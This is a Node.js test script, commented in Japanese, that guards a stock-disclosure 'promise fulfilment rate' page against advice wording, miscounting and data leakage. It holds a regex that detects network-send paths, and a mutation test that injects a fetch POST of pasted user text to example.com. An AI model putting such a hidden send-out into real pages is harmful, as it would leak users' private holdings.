'use strict';
/**
 * verify-yuugen — 「持株の有言実行率」の頁を見張る門番(2026-10-02)
 *
 * この道具は**他人の会社の約束**を数える。だから見るのは見た目ではなく、
 * **数え方と言い方が人を陥れない形になっているか**。
 *
 *   node tools/verify-yuugen.js
 *   node tools/verify-yuugen.js --mutants
 *
 * ★ 変異はその場の写しだけを壊す。追跡下の yuugen.html は一文字も触らない。
 */
const fs = require('fs');
const path = require('path');
const PAGE = path.join(__dirname, '..', 'yuugen.html');

let pass = 0, fail = 0;
const ok = (name, cond, detail) => {
  if (cond) { pass++; console.log('  ✓ ' + name); }
  else { fail++; console.log('  ✗ ' + name + (detail ? '  … ' + detail : '')); }
};

/** 頁の中の抽出の関数を、そのまま切り出して走らせる(写しを作らない=二つに割れない)。 */
function logicOf(html) {
  const a = html.indexOf('function norm(');
  const b = html.indexOf('function todayISO()');
  if (a < 0 || b < 0) return null;
  try { return new Function(html.slice(a, b) + '; return { extract: extract, datesIn: datesIn, norm: norm };')(); }
  catch (e) { return null; }
}

function check(html) {
  pass = 0; fail = 0;

  console.log('\n[言ってはいけない語 — 出した瞬間に投資助言になる]');
  {
    /* 検出器に生の禁止語を並べるのは良いが、**頁の側**に出ていないかだけを見る。 */
    const BAD = ['買い時', '売り時', '割安', '割高', '狙い目', '好機', '急騰', '値上がり', '値下がり',
      'おすすめ', '推奨', '誠実度', '信頼度', '買うべき', '売るべき'];
    const hit = BAD.filter((w) => html.indexOf(w) >= 0);
    ok('価格・推奨・評価の語が一つも無い', hit.length === 0, hit.join(','));
    ok('名乗りが「開示の履歴から数えた率」', html.indexOf('開示の履歴から数えた率') >= 0);
    ok('「株価のことは何も言っていません」と自分で名乗る', html.indexOf('株価のことは何も言っていません') >= 0);
  }

  console.log('\n[貼られた物を、どこへも送らない]');
  {
    /* 持株は、その人の持ち物。送る道が在ること自体を赤にする。 */
    const SEND = /fetch\s*\(|XMLHttpRequest|navigator\.sendBeacon|new\s+WebSocket|<form[^>]*action=/i;
    ok('★ 貼られた文をどこかへ送る道が無い', !SEND.test(html));
    ok('★「どこへも送りません」と画面で名乗っている', html.indexOf('どこへも送りません') >= 0);
  }

  const L = logicOf(html);
  ok('抽出の関数を取り出せる', !!L);
  if (!L) return { pass, fail };

  console.log('\n[NFKC — これが外れると、どの会社も「約束ゼロ」になる]');
  {
    /* 康熙部首の ⽉(U+2F49) ⽇(U+2F47)。PDF の本文抽出が実際に出す形。 */
    const K = '2026 年 11 ' + String.fromCharCode(0x2F49) + '5' + String.fromCharCode(0x2F47)
      + '(予定)に贈呈いたします';
    const src = '2026年9月30日 本日のお知らせ\n' + K;
    const r = L.extract(src);
    ok('★ 康熙部首の「月日」でも約束を拾える', r.dated.length === 1, JSON.stringify(r.dated));
    ok('★ 正規化の口が在る(normalize を呼んでいる)', /normalize\('NFKC'\)/.test(html));
  }

  console.log('\n[何を「言った」と数えるか]');
  {
    const base = '2026年1月5日 お知らせ\n';
    ok('期日つきの約束を拾う',
      L.extract(base + '2026年3月1日に提供を開始いたします。').dated.length === 1);
    ok('★ 期日の無い言い方を「約束」に数えない(順次・検討)',
      L.extract(base + '順次 実施してまいります。').dated.length === 0);
    ok('★ その件数は別に数える(黙って捨てない)',
      L.extract(base + '順次 実施してまいります。').vague === 1);
    ok('★ 過去の開示への言及を約束に数えない',
      L.extract(base + '2026年2月1日付「お知らせ」にて公表のとおり実施しました。').dated.length === 0);
    ok('★ 開示より前の日付を約束に数えない',
      L.extract('2026年6月1日 お知らせ\n2026年3月1日に開始いたしました。').dated.length === 0);
  }

  console.log('\n[幅のある書き方は、幅の終わりで読む(本文より厳しくしない)]');
  {
    const base = '2026年1月5日 お知らせ\n';
    const d = (s) => (L.extract(base + s).dated[0] || {}).due;
    ok('「3月上旬」→ 3/10', d('2026年3月上旬に開始いたします。') === '2026-03-10');
    ok('「3月中旬」→ 3/20', d('2026年3月中旬に締結いたします。') === '2026-03-20');
    ok('「3月末まで」→ 3/31', d('2026年3月末までに完了いたします。') === '2026-03-31');
  }

  console.log('\n[同じ約束を、言い換えの数だけ水増ししない]');
  {
    const r = L.extract('2026年1月5日 お知らせ\n'
      + '2026年3月1日に提供を開始いたします。\n'
      + 'なお提供の開始は 2026年3月1日 を予定しております。\n'
      + '開始予定 2026年3月1日');
    ok('★ 同じ期日は1件に畳む', r.dated.length === 1, String(r.dated.length));
    ok('★ 引用は捨てずに全部 残す', r.dated[0] && r.dated[0].quotes.length === 3,
      r.dated[0] ? String(r.dated[0].quotes.length) : '0');
  }

  console.log('\n[出せない物を、出せるように見せない]');
  {
    ok('★ 母数の下限(5件)を持っている', /MIN_DENOM\s*=\s*5/.test(html));
    ok('★「1件で 0%・100% は数ではなく当てこすり」と理由を書いている',
      html.indexOf('当てこすり') >= 0);
    ok('★ v0 は1本から履行を判定できない、と画面で名乗る',
      html.indexOf('この1本だけでは分かりません') >= 0);
    ok('★「続報が見つからない」は「やっていない」ではない、と書いている',
      html.indexOf('「やっていない」ではありません') >= 0);
    ok('★ 読んだ範囲を画面に出す', html.indexOf('読んだ範囲') >= 0);
    ok('★ 会社を並べないと名乗る', html.indexOf('会社を並べません') >= 0);
  }

  console.log('\n[見本は、自分の会社から]');
  {
    ok('abc 自身の数を棚に置いている', html.indexOf('66.7') >= 0 && html.indexOf('92 件') >= 0);
    ok('見本の母集団が「語で絞っていない」と書いてある', html.indexOf('語で絞らず') >= 0);
  }

  return { pass, fail };
}

const MUT = {
  'nfkc-removed': (s) => s.split("return String(s || '').normalize('NFKC');").join("return String(s || '');"),
  'vague-counted-as-promise': (s) => s.split('if (!ds.length) { if (VAGUE.test(L)) vague++; continue; }')
    .join('if (!ds.length) { continue; }').split('var VAGUE = /(順次').join('var VAGUE = /(ZZZ順次'),
  'past-reference-counted': (s) => s.split('if (PAST.test(L.slice(i2 + x.raw.length, i2 + x.raw.length + 6))) return false;').join(''),
  'backward-date-counted': (s) => s.split('return base ? x.iso > base : true;').join('return true;'),
  'min-denom-gone': (s) => s.split('MIN_DENOM = 5').join('MIN_DENOM = 0'),
  'dedupe-gone': (s) => s.split('if (g) { if (g.quotes.indexOf(L) < 0) g.quotes.push(L); continue; }').join(''),
  'price-word-sneaks-in': (s) => s.split('開示の履歴から数えた率').join('買い時の目安'),
  'sends-what-you-paste': (s) => s.split('var last = null;')
    .join('var last = null; function leak(t){ fetch("https://example.com/x", {method:"POST", body:t}); }'),
  'mid-month-made-stricter': (s) => s.split("m[4] === '中旬' ? 20").join("m[4] === '中旬' ? 11"),
};

const html = fs.readFileSync(PAGE, 'utf8');
if (process.argv.includes('--mutants')) {
  let red = 0, total = 0; const holes = [];
  for (const name of Object.keys(MUT)) {
    total++;
    const m = MUT[name](html);
    if (m === html) { console.log('\n=== mutant ' + name + ': ★変異が当たっていない'); holes.push(name + '(no-op)'); continue; }
    let r; try { r = check(m); } catch (e) { r = { pass: 0, fail: 1 }; }
    if (r.fail > 0) red++; else holes.push(name);
    console.log('\n=== mutant ' + name + ': ' + (r.fail > 0 ? 'RED(門番が捕まえた)' : '★GREEN=門番の穴')
      + ' (' + r.pass + '/' + r.fail + ')');
  }
  console.log('\nmutants: ' + red + '/' + total + ' RED' + (holes.length ? '  穴: ' + holes.join(', ') : ''));
  process.exit(red === total ? 0 : 1);
}
const r = check(html);
console.log('\n' + r.pass + ' 緑 / ' + r.fail + ' 赤');
console.log('見ていない所: 実機での見た目・PDF の読み込み(外の pdf.js が落ちた時は「貼る」道へ落ちる)・札の絵。');
process.exit(r.fail ? 1 : 0);
